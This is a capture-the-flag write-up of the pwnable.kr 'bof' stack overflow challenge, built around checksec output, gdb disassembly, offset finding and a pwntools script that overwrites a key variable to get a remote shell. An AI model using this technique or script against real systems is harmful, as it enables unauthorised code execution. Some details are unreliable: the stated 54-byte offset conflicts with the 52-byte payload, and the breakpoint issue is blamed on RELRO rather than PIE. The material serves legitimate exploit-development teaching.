# bof

As the name suggests (bof stands for Buffer OverFlow) this is the first exploit development task that we have to accomplish. It's a classic buffer overflow on x86 leading to shell.

On this challenge we have a simple buffer overflow to exploit, but it's a good chance to give you my mind map on how I approach that type of challenges, hope that helps some of you construct a methodology.

My methodology on how to approach buffer overflows consists of the following steps.

- 1. Check the architecture of the binary.
- 2. Check for the security of the binary (RELRO,NX etc)
- 3. Reverse engineer the binary to determine the target and check how the security measures of the binary affect it
- 4. Get control of the EIP/RIP manually if that's possible (e.g. on stack based buffer overflows like this one it is, while there are others that you have to ROP them)
- 5. Develop the exploit.
- 6. PWN it!

## Enumeration 
### Step 1

Running **file** against the binary is more than enough to give us the information we want, that is that
the file is compiled as x86_32-bit. That tells us that the memmory addresses will have a length of 4 bytes.
(e.g 0xFFFFFFFF)

```
shad3@zeroday:~/Desktop/Security/CTF/pwnable.kr/bof$ file bof
bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped
```
### Step 2

For that step we have to load the binary to gdb to check for its security measures by using an addon e.g. gdb-peda or pwndbg it's much easier to find the answer that we'are looking for, even though it is viable to do it without one.

```python
gdb-peda$ file bof
Reading symbols from bof...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
```
In other cases finding that all these security measures are enabled would have scarred the sh@t out of me,
but on the next step we'll explain why they are irrelevant in our case.

### Step 3

We've been given the source code so there's no need to reverse the binary, by looking at it we immediatly see the call of the vulerable function **gets()** int the function **func** that's where the buffer overflow will occur.In that function we also can see a check between the variable **key** which is always set to **0xdeadbeef** and the hexadecimal value **0xcafebabe**. If we pass this check the binary spawns a shell. But since the key has always the value 0xdeadbeef this check will always fail .... or not?.

```c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}

```

It's pretty clear from now on that we have to overflow the **overflowme[32]** array and overwrite the value of 0xdeadbeef with 0xcafebabe so that we can get our shell by passing the check.
## Exploit
### Step 4

We know that the buffer is 32 bytes so lets create a pattern of 60 bytes to be sure that we'll overflow it.
To determine the offset of the key variable we have to take a look at the disassemble dump of the **func()** variable 
```python
gdb-peda$ disassemble func 
Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
   0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:    call   0xf7e2bb40 <puts>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7e2b2b0 <gets>
=> 0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:    call   0xf7e01200 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:    call   0xf7e2bb40 <puts>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7ecdb60 <__stack_chk_fail>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret    
End of assembler dump.
gdb-peda$ 
```
We have to set the breakpoint at the CMP -compaire- instuction between 0xcafebabe and the key variable (keep in mind that RELRO is enabled so you have to set a breakpoint at the main function, run the binary to hit the breakpoint, so that the system assigns to the instructions their address space and then set a breakpoint inside the func() function). As it is shown on the disassembly of the function the key variable at this point it's stored, where the EBP register is pointing plus 0x8 bytes. So let's hit the breakpoint to determine where in the buffer that we send, the EBP register is pointing.


```python
[----------------------------------registers-----------------------------------]
EAX: 0xffffcebc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA")
EBX: 0x0 
ECX: 0xf7f9c5c0 --> 0xfbad2098 
EDX: 0xf7f9d89c --> 0x0    
ESI: 0xf7f9c000 --> 0x1d7d6c 
EDI: 0x0 
EBP: 0xffffcee8 ("AFAAbAA1AAGAAcAA")
ESP: 0xffffcea0 --> 0xffffcebc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA")
EIP: 0x56555654 (<func+40>:     cmp    DWORD PTR [ebp+0x8],0xcafebabe)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555649 <func+29>:        lea    eax,[ebp-0x2c]
   0x5655564c <func+32>:        mov    DWORD PTR [esp],eax
   0x5655564f <func+35>:        call   0xf7e2b2b0 <gets>
=> 0x56555654 <func+40>:        cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <func+47>:        jne    0x5655566b <func+63>
   0x5655565d <func+49>:        mov    DWORD PTR [esp],0x5655579b
   0x56555664 <func+56>:        call   0xf7e01200 <system>
   0x56555669 <func+61>:        jmp    0x56555677 <func+75>
[------------------------------------stack-------------------------------------]
0000| 0xffffcea0 --> 0xffffcebc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA")
0004| 0xffffcea4 --> 0x0 
0008| 0xffffcea8 --> 0x0 
0012| 0xffffceac --> 0x0 
0016| 0xffffceb0 --> 0x9 ('\t')
0020| 0xffffceb4 --> 0xffffd194 ("/home/shad3/Desktop/Security/CTF/pwnable.kr/bof/bof")
0024| 0xffffceb8 --> 0xf7df44a9 (add    ebx,0x1a7b57)
0028| 0xffffcebc ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x56555654 in func ()
gdb-peda$ 
```
As we can see the offset (EBP register) we find is at 44 bytes + 0x8
```
gdb-peda$ pattern offset AFAA
AFAA found at offset: 44
```
That being said we can calculate that at 54 bytes we start overwriting the 0xdeadbeef value.
If we set that value to 0xcafebabe the check will return 1 and we'll hopefully get our shell.
Note: We are on a x86 system so we have to use little endian on the 0xcafebabe value. Follow the link bellow to get a better understand what is the little endian memmory format.
https://chortle.ccsu.edu/AssemblyTutorial/Chapter-15/ass15_3.html

### Step 5

I have the chance to  introduce you to my favorite python library, that's pwntools. It's a library designed for exploit development, pwnning etc. The script bellow connects to the server, sends the payload that will give us a shell and then switches to interactive mode which is pretty much redirecting the STDIN and STDOUT to that process.

Our payload will have the following format:

PAYLOAD : [AAAAAAA BUFFER SPACE OF 52 BYTES AAAA] + [0xcafebabe in little endian format]

```python
from pwn import *

payload = 'A' * 52 + p32(0xcafebabe)
p = remote('pwnable.kr',9000)
p.sendline(payload)
p.interactive()
```


By running it spawns as a shell yey!!

```python
shad3@zeroday:~/Desktop/Security/CTF/pwnable.kr/bof$ python bof.py 
[+] Opening connection to pwnable.kr on port 9000: Done
[*] Switching to interactive mode
$ ls -la
total 6056
drwxr-x---   3 root bof     4096 Oct 23  2016 .
drwxr-xr-x 116 root root    4096 Nov 12 21:34 ..
d---------   2 root root    4096 Jun 12  2014 .bash_history
-r-xr-x---   1 root bof     7348 Sep 12  2016 bof
-rw-r--r--   1 root root     308 Oct 23  2016 bof.c
-r--r-----   1 root bof       32 Jun 11  2014 flag
-rw-------   1 root root 6162219 Apr  9 05:55 log
-rw-r--r--   1 root root       0 Oct 23  2016 log2
-rwx------   1 root root     760 Sep 11  2014 super.pl
$ wc -c flag
32 flag
$  
```





















